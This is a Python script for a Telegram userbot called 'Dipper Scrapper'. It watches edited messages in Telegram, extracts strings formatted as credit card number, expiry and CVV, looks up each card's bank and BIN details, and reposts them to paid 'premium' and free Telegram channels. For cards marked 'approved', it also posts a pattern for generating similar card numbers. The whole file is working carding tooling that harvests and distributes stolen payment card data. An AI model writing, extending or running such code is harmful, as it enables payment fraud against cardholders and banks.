import re, os, requests,time
from telethon.sync import ( TelegramClient,events )
from func.dates import ( API_HASD ,
                         API_ID,
                         NUMERO,
                         APROVED,
                         CHAT_ID,
                         TOKEN,
                         get_bin_info,
                         getcards
                         
                         )

client = TelegramClient('SCRAPP', API_ID, API_HASD)
client.start(NUMERO)


def enviar(id,texto,photo,Botuun):

    params = {'chat_id': id,'caption': texto,'parse_mode': 'HTML','photo': photo,'reply_markup': {'inline_keyboard': Botuun}}
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', json=params).text


@client.on(events.MessageEdited())
async def handler(event):
    time.sleep(3)

    getMsg = event.message.message.upper()  
    RexGex = r'\d{14,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}'
    ScrCss = re.sub(RexGex, r'<code>\g<0></code>', getMsg)

    ccs = getcards(ScrCss)
    if ccs == False: return
    
    bin_info = get_bin_info(ccs[0])
    bina = ccs[0]
    
    for live in APROVED:
        if live in ScrCss:
            text = f'''𝐃𝐢𝐩𝐩𝐞𝐫 𝐒𝐜𝐫𝐚𝐩𝐩𝐞𝐫 | 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 

↯𝗙𝗶𝗻𝗱𝗲𝗿 𝗕𝗶𝗻 :  #BIN{bin_info['number']}
↯𝗖𝗖:  <code>{ccs[0]}|{ccs[1]}|{ccs[2]}|{ccs[3]}</code>
╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺
↯ꜱᴛᴀᴛᴜꜱ: Approved ✅
↯ʀᴇꜱᴘᴏɴꜱᴇ: <code>{live}</code>
╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺
↯ᴇxᴛʀᴀ:  <code>{bina[:12]}xxxx|{ccs[1]}|{ccs[2]}|rnd</code> 
↯ʙᴀɴᴋ:  <code>{bin_info['bank']}</code>
↯ɪɴꜰᴏ:  {bin_info['type']} | {bin_info['vendor']} | {bin_info['level']} 
↯ᴄᴏᴜɴᴛʀʏ:  {bin_info ['country']} [{bin_info['flag']}]
╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺
𝙊𝙬𝙣𝙚𝙧: @Bvnesv4444
𝘿𝙚𝙫: @Jaycitoxz'''
            premium = [[{'text': 'Referencias', 'url': 'https://t.me/dipperrefes'},
                        {'text': 'Users chat ', 'url': 'https://t.me/+mYarH--4651kZWYx'}]]
            
            enviar(-1002177889555, text,'https://i.imgur.com/0MJPGok.jpeg',premium)
    

    free = [[{'text': 'REFERENCIAS',      'url': 'https://t.me/dipperrefes'},
             {'text': 'Free Users',     'url': 'https://t.me/DipperFreeUsers'}],[
             {'text': 'ADQUERIR PREMIUM', 'url': 'https://t.me/DipperStaff'},]]

    text1 = f'''𝐃𝐢𝐩𝐩𝐞𝐫 𝐒𝐜𝐫𝐚𝐩𝐩𝐞𝐫 | 𝙁𝙍𝙀𝙀

↯𝗙𝗶𝗻𝗱𝗲𝗿 𝗕𝗶𝗻 :  #BIN{bin_info['number']}
↯𝗖𝗖:  <code>{ccs[0]}|{ccs[1]}|{ccs[2]}|{ccs[3]}</code>
╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺
↯ ᴇxᴛʀᴀ:  <code>{bina[:12]}xxxx|{ccs[1]}|{ccs[2]}|rnd</code> 
↯ ʙᴀɴᴋ:  <code>{bin_info['bank']}</code>
↯ ɪɴꜰᴏ:  {bin_info['type']} | {bin_info['vendor']} | {bin_info['level']} 
↯ ᴄᴏᴜɴᴛʀʏ:  {bin_info ['country']} [{bin_info['flag']}]
╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺
𝙊𝙬𝙣𝙚𝙧: @Bvnesv4444
𝘿𝙚𝙫: @Jaycitoxz'''
    enviar(-1002118768399, text1,'https://imgur.com/NF9dGum.jpeg',free)
    

os.system("cls")


banner ="""
    ____                          ___                       _    __
   / __ \  ___    _  __          /   | _      __  ____ _   (_)  / /_
  / /_/ / / _ \  | |/_/         / /| || | /| / / / __ `/  / /  / __/
 / _, _/ /  __/ _>  <          / ___ || |/ |/ / / /_/ /  / /  / /_
/_/ |_|  \___/ /_/|_|         /_/  |_||__/|__/  \__,_/  /_/   \__/
                                                𝗧𝗵𝗲𝗪𝗼𝗿𝗹𝗱𝗔𝗽𝗶𝘀 「🐉」

『⁣✪』User: 6411167257 
『⁣✪』Code by: @RexAwait 👑"""

print(banner)


client.run_until_disconnected()
